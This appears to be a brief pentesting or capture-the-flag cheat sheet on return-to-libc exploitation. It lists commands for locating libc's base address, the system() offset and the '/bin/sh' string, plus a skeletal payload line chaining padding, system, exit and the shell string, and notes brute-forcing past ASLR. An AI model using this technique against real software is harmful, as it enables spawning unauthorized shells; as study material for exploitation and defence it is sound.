# Return-To-Libc
Find the libc used and base address for a given application
```sh
ldd /usr/local/bin/overflw | grep libc
```

Find the libc relative address for the system (or any other function) function in the given libc file
```sh
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```

Find the libc relative address of the /bin/sh string in the given libc file
```sh
strings -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```

If ASLR, the base address of libc changes so bruteforcing it can work
```python
payload = (nop * overflow count) + system + exit + binsh
```
